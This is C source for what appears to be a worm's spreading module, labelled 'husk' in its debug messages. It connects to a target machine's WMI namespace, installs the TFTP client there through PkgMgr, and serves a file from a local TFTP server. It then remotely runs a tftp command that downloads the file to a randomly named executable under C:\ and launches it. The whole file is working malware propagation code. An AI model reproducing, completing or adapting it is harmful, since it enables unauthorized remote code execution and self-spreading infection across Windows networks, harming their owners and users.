
#include "main.h"
#include "globals.h"

BOOL propagate_through_wmi(PCHAR target)
{
	ERROR_CODE			status;
	IWbemLocator		*iwbem_locator = NULL;
	IWbemServices		*iwbem_services = NULL;

	BSTR				resource; //= SysAllocString(L"\\\\WIN01AD\\ROOT\\CIMV2");
	BSTR				method_name;
	BSTR				class_name;
	BSTR				return_value;

	BSTR				os_wql;
	BSTR				os_select;

	BSTR				process_wql;
	BSTR				process_select;


	// tftp
	IWbemClassObject	*class_object_tftp				= NULL;
	IWbemClassObject	*class_object_tftp_parms		= NULL;
	IWbemClassObject	*class_object_tftp_instance		= NULL;
	IWbemClassObject	*class_object_tftp_parms_out	= NULL;

	// tftp client
	IWbemClassObject	*class_object_cli				= NULL;
	IWbemClassObject	*class_object_cli_parms			= NULL;
	IWbemClassObject	*class_object_cli_instance		= NULL;
	IWbemClassObject	*class_object_cli_parms_out		= NULL;

	// payload
	IWbemClassObject	*class_object_pay				= NULL;
	IWbemClassObject	*class_object_pay_parms			= NULL;
	IWbemClassObject	*class_object_pay_instance		= NULL;
	IWbemClassObject	*class_object_pay_parms_out		= NULL;

	IEnumWbemClassObject *class_os_enum					= NULL;
	IWbemClassObject	*class_os						= NULL;

	IEnumWbemClassObject *class_process_enum			= NULL;
	IWbemClassObject	 *class_process					= NULL;

	VARIANT				variantcommand_tftp;
	VARIANT				variantreturn_tftp;

	VARIANT				variantcommand_cli;
	VARIANT				variantreturn_cli;

	VARIANT				variantcommand_pay;
	VARIANT				variantreturn_pay;

	VARIANT				variant_os_property;
	CIMTYPE				cimtype_os_property;

	VARIANT				variant_process_property;
	CIMTYPE				cimtype_process_property;

	BYTE				*version_pointer;

	wchar_t				tftp_buffer_string[1024]		= {0};
	wchar_t				exec_buffer_string[1024]		= {0};
	wchar_t				tmp[512]						= {0};
	wchar_t				ip_address_string[64]			= {0};
	char				*ip_address_stringA;

	ULONG				os_returned						= 0;
	ULONG				process_returned				= 0;

	struct in_addr		address_struct;

	wchar_t				resource_string[1024];
	wchar_t				*hostname;

	char				file_name[15]					= {0};
	char				charset[] = CHARACTER_MAP;

	int					i;

	ZeroMemory(resource_string, sizeof(resource_string));
	ascii_to_unicode(target, ip_address_string);	
	wsprintfW(resource_string, L"\\\\%s\\ROOT\\CIMV2", ip_address_string);

#ifdef DEBUG_OUT
	DEBUGW(resource_string);
#endif
	//send_debug_channelw(resource_string);

	resource			= create_bstr(resource_string);
	method_name			= create_bstr(L"Create");
	class_name			= create_bstr(L"Win32_Process");
	return_value		= create_bstr(L"ReturnValue");
	os_wql				= create_bstr(L"WQL");
	os_select			= create_bstr(L"SELECT * FROM Win32_OperatingSystem");

	process_select		= create_bstr(L"SELECT * FROM Win32_Process Where Name = 'PkgMgr.exe'");
	process_wql			= create_bstr(L"WQL");


	//send_debug_channel(">>> [husk] <<< Opening COM...");

	///////////////////////////////////////////////////////
	//	Initialize COM (establish remote namespace pipe)
	///////////////////////////////////////////////////////
	{
		if (CoInitializeEx(0, COINIT_MULTITHREADED) != S_OK) {
#ifdef DEBUG_OUT
			send_debug_channel("!husk> Failed to initialize COM");
#endif
			return FALSE;
		}
		//send_debug_channel(">>> [husk] <<< COM Opened");

		// Initialize Security
		if (FAILED(CoInitializeSecurity(	NULL,
											-1,
											NULL,
											NULL,
											RPC_C_AUTHN_LEVEL_DEFAULT,
											RPC_C_IMP_LEVEL_IMPERSONATE,
											NULL,
											EOAC_NONE,
											NULL))) {
#ifdef DEBUG_OUT
			send_debug_channel("!husk> Failed to set security levels");
#endif
			return FALSE;
		}

		// Create instance
		if (FAILED(CoCreateInstance(	&CLSID_WbemLocator,
										0,
										CLSCTX_INPROC_SERVER,
										&IID_IWbemLocator,
										(LPVOID *)&iwbem_locator))) {
#ifdef DEBUG_OUT
			send_debug_channel("!husk> Failed to create instance");
#endif
			return FALSE;
		}
		//send_debug_channel(">>> [husk] <<< IWbem instance created");

		// Connect to remote namespace
		Sleep(500);
#ifdef DEBUG_OUT
		send_debug_channel("+husk> WMI Opened, attempting to connect to remote namespace...");
#endif
		if (FAILED(iwbem_locator->lpVtbl->ConnectServer(iwbem_locator,
														resource,
														NULL,
														NULL,
														0,
														NULL,
														0,
														0,
														&iwbem_services))) {
			//iwbem_locator->lpVtbl->Release(iwbem_locator);
			//iwbem_services->lpVtbl->Release(iwbem_services);
			//CoUninitialize();
			//HeapFree(GetProcessHeap(), 0, resource);
#ifdef DEBUG_OUT
			DEBUG("+husk> Incorrect privileges!");
#endif
			return FALSE;
		}
#ifdef DEBUG_OUT
		Sleep(500);
		send_debug_channel("+husk> Connected.");
#endif
	}

	CoSetProxyBlanket(	iwbem_services,
						RPC_C_AUTHN_WINNT,
						RPC_C_AUTHZ_NONE,
						NULL,
						RPC_C_AUTHN_LEVEL_CALL,
						RPC_C_IMP_LEVEL_IMPERSONATE,
						NULL,
						EOAC_NONE);

	////////////////////////////////////////
	//	Get OS Information
	////////////////////////////////////////
	{
		
		status = 
		iwbem_services->lpVtbl->ExecQuery(	iwbem_services,
											os_wql,
											os_select,
											WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
											0,
											&class_os_enum);
		if (FAILED(status)) {
			return;
		}

		status =
		class_os_enum->lpVtbl->Next(	class_os_enum,
										WBEM_INFINITE,
										1, 
										&class_os,
										(PULONG)&os_returned);
		if (FAILED(status)) {
			return;
		}

		status =
		class_os->lpVtbl->Get(		class_os,
									L"Version",
									0,
									&variant_os_property, // FIXME VARIANT is BSTR (heap overflow)
									&cimtype_os_property,
									0);
		if (FAILED(status)) {
			return;
		}
		
		// Check BSTR output
		version_pointer = (PBYTE)variant_os_property.bstrVal;
		if (*version_pointer == 0x36) {
			// NT 6.0+

				// Check for a PkgMgr instance and wait until close
#ifdef WAIT_FOR_PKGMGR
				while (TRUE) {
					status = 
					iwbem_services->lpVtbl->ExecQuery(	iwbem_services,
														process_wql,
														process_select,
														WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
														0,
														&class_process_enum);
					if (FAILED(status)) {
						return;
					}

					status =
					class_process_enum->lpVtbl->Next(	class_process_enum,
														WBEM_INFINITE,
														1, 
														&class_process,
														(PULONG)&process_returned);
					if (FAILED(status)) {
						return;
					}

					if (!process_returned) {

						break;
					}

					class_process->lpVtbl->Release(class_process);
					class_process_enum->lpVtbl->Release(class_process_enum);

					//if (variant_process_property.uiVal) {
					//	break;
					//}

#ifdef DEBUG_OUT
					send_debug_channel("...");
#endif
					Sleep(2000);

				}
#endif

			////////////////////////////////////////
			// Create remote tftpd client
			////////////////////////////////////////

			status =
			iwbem_services->lpVtbl->GetObject(	iwbem_services,
												class_name,
												0,
												NULL,
												&class_object_cli,
												NULL);
			if (status != WBEM_S_NO_ERROR) {
				return;
			}

			status =
			class_object_cli->lpVtbl->GetMethod(	class_object_cli,
													method_name,
													0,
													&class_object_cli_parms,
													NULL);
			if (status != WBEM_S_NO_ERROR) {
				return;
			}

			status =
			class_object_cli_parms->lpVtbl->SpawnInstance(	class_object_cli_parms,
															0,
															&class_object_cli_instance);
			if (status != WBEM_S_NO_ERROR) {
				return;
			}

			variantcommand_cli.vt		= VT_BSTR;
			variantcommand_cli.bstrVal = L"PkgMgr.exe -iu:TFTP";

			class_object_cli_instance->lpVtbl->Put(	class_object_cli_instance,
														L"CommandLine",
														0,
														&variantcommand_cli,
														0);
			if (status != WBEM_S_NO_ERROR) {
				return;
			}

			
#ifdef INSTALL_TFTP_CLIENT
			status = iwbem_services->lpVtbl->ExecMethod(	iwbem_services,
															class_name,
															method_name,
															0,
															NULL,
															class_object_cli_instance,
															&class_object_cli_parms_out,
															NULL);

#ifdef DEBUG_OUT
				send_debug_channel("+husk> Waiting for tftp to install on remote machine...");
#endif


#ifdef WAIT_FOR_PKGMGR
				while (TRUE) {
					status = 
					iwbem_services->lpVtbl->ExecQuery(	iwbem_services,
														process_wql,
														process_select,
														WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
														0,
														&class_process_enum);
					if (FAILED(status)) {
						return;
					}

					status =
					class_process_enum->lpVtbl->Next(	class_process_enum,
														WBEM_INFINITE,
														1, 
														&class_process,
														(PULONG)&process_returned);
					if (FAILED(status)) {
						return;
					}

					if (!process_returned) {

						break;
					}

					class_process->lpVtbl->Release(class_process);
					class_process_enum->lpVtbl->Release(class_process_enum);

					//if (variant_process_property.uiVal) {
					//	break;
					//}

#ifdef DEBUG_OUT
					send_debug_channel("...");
#endif
					Sleep(2000);

				}

#endif

#endif

			if (FAILED(status)) {
#ifdef DEBUG_OUT
				send_debug_channel("!husk> Failed to execute method install package 0x%08x", status);
#endif
				return FALSE;
			}

#ifdef DEBUG_OUT
			send_debug_channel("+husk> Waiting on tftp client to install (takes a few minutes)...");
#endif
			//Sleep(TFTP_INSTALL_WAIT); // FIXME 
		} else if (*version_pointer == 0x35) {
			// NT 5.0
			// Need to do nothing
		} else {
			// FIXME
		}

	}

	////////////////////////////////////////////////////////
	//	Create local tftpd & send tftp client signal
	////////////////////////////////////////////////////////
	{
#ifdef DEBUG_OUT
		send_debug_channel("+husk> Starting local tftpd...");
#endif
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)tftpd_intro, NULL, 0, NULL);

		// Wait for tftp to initialize
		Sleep(500);
		EnterCriticalSection(&husk_tftp_sync);

		// Send signal to remote namespace (tftp)
		status =
		iwbem_services->lpVtbl->GetObject(	iwbem_services,
											class_name,
											0,
											NULL,
											&class_object_tftp,
											NULL);
		if (status != WBEM_S_NO_ERROR) {
			return;
		}

		status =
		class_object_tftp->lpVtbl->GetMethod(	class_object_tftp,
												method_name,
												0,
												&class_object_tftp_parms,
												NULL);
		if (status != WBEM_S_NO_ERROR) {
			return;
		}

		status =
		class_object_tftp_parms->lpVtbl->SpawnInstance(	class_object_tftp_parms,
														0,
														&class_object_tftp_instance);
		if (status != WBEM_S_NO_ERROR) {
			return;
		}

		// Generate a filename
		file_name[0] = 'a';
		for (i = 1; i < (sizeof(file_name) - 1); i++) {
			file_name[i] = charset[generate_random_byte_range(strlen(charset))];
		}

		// Create our tftp string
		address_struct.S_un.S_addr = get_local_ip_address();
		ip_address_stringA = inet_ntoa(address_struct);
		ascii_to_unicode(ip_address_stringA, tmp);
		wsprintfW(tftp_buffer_string, L"tftp -i %s GET abcde12345", (wchar_t *)tmp);
		ZeroMemory(tmp, sizeof(tmp));
		ascii_to_unicode(file_name, tmp);
		wsprintfW(tftp_buffer_string, L"%s C:\\%s.exe", tftp_buffer_string, tmp);
		ZeroMemory(tmp, sizeof(tmp));


		variantcommand_tftp.vt		= VT_BSTR;
		variantcommand_tftp.bstrVal = tftp_buffer_string;

		class_object_tftp_instance->lpVtbl->Put(	class_object_tftp_instance,
													L"CommandLine",
													0,
													&variantcommand_tftp,
													0);
		if (status != WBEM_S_NO_ERROR) {
			return;
		}


#ifdef DEBUG_OUT
		send_debug_channel("+husk> Installing payload...");
#endif

		status = iwbem_services->lpVtbl->ExecMethod(	iwbem_services,
														class_name,
														method_name,
														0,
														NULL,
														class_object_tftp_instance,
														&class_object_tftp_parms_out,
														NULL);
		if (FAILED(status)) {

#ifdef DEBUG_OUT
			send_debug_channel("!husk> Failed to execute method [tftp] 0x%08x", status);
#endif

			return FALSE;
		}

		LeaveCriticalSection(&husk_tftp_sync);
		Sleep(500);

		//Sleep(INFINITE);

		// Wait for tftpd
		EnterCriticalSection(&husk_tftp_sync);
	
		if (!read_registry_key(TFTPD_RC_HIVE, TFTPD_RC_SUBKEY, TFTPD_RC_NAME)) {

#ifdef DEBUG_OUT
			send_debug_channel("!husk> tftpd returned an error.");
#endif

			// We return a failure

			LeaveCriticalSection(&husk_tftp_sync);
			return FALSE;
		}
	}

	LeaveCriticalSection(&husk_tftp_sync);

	///////////////////////////////////////////////////
	//	Execute remote payload
	///////////////////////////////////////////////////
	{
		Sleep(15000); //FIXME

#ifdef DEBUG_OUT
		DEBUG("+husk> Starting payload...");
#endif

		/////////////////////////////////////BREAK;

		iwbem_services->lpVtbl->GetObject(	iwbem_services,
											class_name,
											0,
											NULL,
											&class_object_pay,
											NULL);

		class_object_tftp->lpVtbl->GetMethod(	class_object_pay,
												method_name,
												0,
												&class_object_pay_parms,
												NULL);

		class_object_tftp_parms->lpVtbl->SpawnInstance(	class_object_pay_parms,
														0,
														&class_object_pay_instance);

		ZeroMemory(tmp, sizeof(tmp));
		ascii_to_unicode(file_name, tmp);
		wsprintfW(exec_buffer_string, L"C:\\%s.exe", tmp);
		//HeapFree(GetProcessHeap(), 0, tmp);

		variantcommand_pay.vt		= VT_BSTR;
		variantcommand_pay.bstrVal = exec_buffer_string;

		class_object_tftp_instance->lpVtbl->Put(	class_object_pay_instance,
													L"CommandLine",
													0,
													&variantcommand_pay,
													0);

		status = iwbem_services->lpVtbl->ExecMethod(	iwbem_services,
														class_name,
														method_name,
														0,
														NULL,
														class_object_pay_instance,
														&class_object_pay_parms_out,
														NULL);
		if (FAILED(status)) {
#ifdef DEBUG_OUT
			DEBUG("!husk> Failed to execute method [payload] 0x%08x", status);
#endif
			return FALSE;
		} 

#ifdef DEBUG_OUT		
			else {
			DEBUG("!husk> Success!", status);

		}
#endif
	}
	
	// FIXME - freeup BSTRs
	iwbem_locator->lpVtbl->Release(iwbem_locator);
	iwbem_services->lpVtbl->Release(iwbem_services);
	//HeapFree(GetProcessHeap(), 0, resource);
	CoUninitialize();

	return TRUE;
}

PCHAR get_local_dc(VOID)
{
	LPWKSTA_INFO_102 info = {0};

	NetWkstaGetInfo(NULL, 102, (LPBYTE *)&info);

}


